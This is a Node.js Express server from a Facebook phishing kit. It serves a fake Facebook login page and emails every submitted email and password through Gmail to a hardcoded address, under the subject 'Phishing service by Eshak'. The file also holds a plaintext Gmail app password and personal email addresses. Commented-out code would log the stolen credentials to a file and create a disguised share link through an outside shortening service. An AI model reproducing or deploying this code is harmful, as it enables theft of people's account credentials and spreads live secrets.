const express = require('express');
const exphbs = require('express-handlebars');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const os = require('os');
var port = process.env.PORT || 1111;
var networkInterfaces = os.networkInterfaces();
var nodemailer = require('nodemailer');

const app = express();

app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
app.set('view engine', 'handlebars');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use('/phishing-facebook', express.static('phishing-facebook'));

app.get('/', function (req, res) {
    res.render('f_login');
    
    
    
});
var myArray = [
    {"id": 1, "name": "admin", "email": "mdalonebd@gmail.com"},

    {"id": 2, "name": "Peter"},
    {"id": 3, "name": "Harry"}
];


app.post('/_', function (req, res) {
   // res.render('f_success');
    var captured_content = `\n Email: ${req.body.email} Password: ${req.body.password}`;
    let toMail = req.body.owner;
    
    console.log("es"+toMail);
    var message = "If the input value has correct then id was hacked "+captured_content;
  
    let toEmail = myArray.find(o => o.id === 1);

   console.log(toEmail.email);
  
    var transporter = nodemailer.createTransport({
    service: "gmail",

  auth: {
    user: "bdeshak5@gmail.com",
    pass: "dbinvztuehilrkkz"
  }
});

   const mailOptions = {
  from: 'bdeshak5@gmail.com',
  to: toEmail.email, //list of receivers
  subject: 'Phishing service by "Eshak"', // Subject line
  text: message //plain text body
};

transporter.sendMail(mailOptions, function (err, info) {
  if (err)
    console.log(err)
  else
    console.log(info);
    
    res.render('f_success');
});
    
    console.log(67);
    
 //   res.render('f_success');
    
    /*
    
    fs.appendFile('logs.txt', captured_content, err => {
        if (err) {
            console.error(err)
            return
        }
    });
    console.log("eshak:"+captured_content);
    
    */
    
});

app.get('/images/eye-off.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/eye-off.png'))
});
app.get('/images/eye.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/eye.png'))
});
app.get('/images/favicon.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/favicon.png'))
});
app.get('/images/logo.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/logo.png'))
});
app.get('/images/check.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/check.png'))
});

app.listen(port, () => {
    console.log('[!] Server Running!')
});

/*
axios.get(`http://anoni4.cf/api?create&key=D03hVPibJRaxvXqmus8NAE7WC6n2KyfGcwI&link=http://${networkInterfaces.Ethernet[0].address}:${port}`).then(async res => {
    console.log(`[!] You can share this hidden link with your network users: ${res.data.Link}\n[!] If the link doesn't work. Try using your IPV4 + PORT: ${networkInterfaces.Ethernet[0].address}:${port}\n\n[+] Give this project a star on GitHub: https://github.com/pauloodev/phishing-facebook`)
});

*/
